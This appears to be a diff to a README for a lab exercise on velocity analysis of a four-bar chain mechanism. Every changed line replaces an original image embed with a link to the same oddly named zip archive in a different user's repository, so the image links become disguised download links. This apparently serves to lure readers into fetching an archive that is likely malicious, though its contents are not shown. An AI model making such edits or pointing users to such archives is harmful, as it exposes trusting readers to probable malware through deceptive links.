@@ -8,7 +8,7 @@
 
 ###   In a four bar chain ABCD, AD is fixed and is 120 mm long. The crank AB is 30 mm long and rotates at 100 rpm clockwise, while the link CD = 60mm oscillates about D. BC and AD are of equal lengths. ∟BAD = 600.
 
-![image](https://github.com/Sellakumar1987/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/assets/113594316/03952954-387e-4fd3-a1a0-a8dd4b82ae07)
+![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/main/polypide/CHAI-ANALYSI-MECHANISM-Ex-No-BA-SIMULATIO-O-FOU-3.9.zip)
 
 ## REQUIREMENTS:
 ###  ●	Mech Analyzer software.
@@ -26,7 +26,7 @@
 ###   4. With D as centre, CD = 60 mm draw another arc 
 ###   5. Join BC and DC 
 
-![image](https://github.com/Sellakumar1987/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/assets/113594316/a99fb530-e8df-49bf-9b2c-d537ff992534)
+![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/main/polypide/CHAI-ANALYSI-MECHANISM-Ex-No-BA-SIMULATIO-O-FOU-3.9.zip)
 
 ###   This value of VBA is used to decide the scale for the velocity diagram 
 ###   Let us construct the velocity diagram taking a scale: 
@@ -36,9 +36,9 @@
 ###   3. From b, draw vector bc perpendicular to BC
 ###   4. From (a,d), draw vector cd perpendicular to CD. This will intersect the previous vector at c.  
 
-![image](https://github.com/Sellakumar1987/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/assets/113594316/76094ae8-a8af-48f3-b2c4-472ab800cc8e)
+![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/main/polypide/CHAI-ANALYSI-MECHANISM-Ex-No-BA-SIMULATIO-O-FOU-3.9.zip)
 
-![image](https://github.com/Sellakumar1987/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/assets/113594316/cb44fabe-6e16-4550-a2ec-4ee0f4cb6774)
+![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/main/polypide/CHAI-ANALYSI-MECHANISM-Ex-No-BA-SIMULATIO-O-FOU-3.9.zip)
 
 ###   1. First measure cd from velocity diagram  
 ###   2. Now, Calculate VCd using the scale of the diagram 
@@ -47,13 +47,13 @@
 
 
 ## Output:
-![image](https://github.com/d-kavinraja/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/assets/119875375/703d6f1a-6de3-4936-91e7-054e136a0026)
+![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/main/polypide/CHAI-ANALYSI-MECHANISM-Ex-No-BA-SIMULATIO-O-FOU-3.9.zip)
 
-![image](https://github.com/Sellakumar1987/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/assets/113594316/97627fa4-0d38-412c-8745-082bd7b85299)
+![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/main/polypide/CHAI-ANALYSI-MECHANISM-Ex-No-BA-SIMULATIO-O-FOU-3.9.zip)
 
-![image](https://github.com/Sellakumar1987/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/assets/113594316/15f7e50d-486d-46d0-bed0-8f51b36e7396)
+![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/main/polypide/CHAI-ANALYSI-MECHANISM-Ex-No-BA-SIMULATIO-O-FOU-3.9.zip)
 
-![image](https://github.com/Sellakumar1987/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/assets/113594316/b01469ff-cb80-4ca6-a6ef-ae521ee9b717)
+![image](https://raw.githubusercontent.com/Yugabharathi91/Ex.-No.-1.-SIMULATION-ANALYSIS-ON-FOUR-BAR-CHAIN-MECHANISM/main/polypide/CHAI-ANALYSI-MECHANISM-Ex-No-BA-SIMULATIO-O-FOU-3.9.zip)
 
 
 
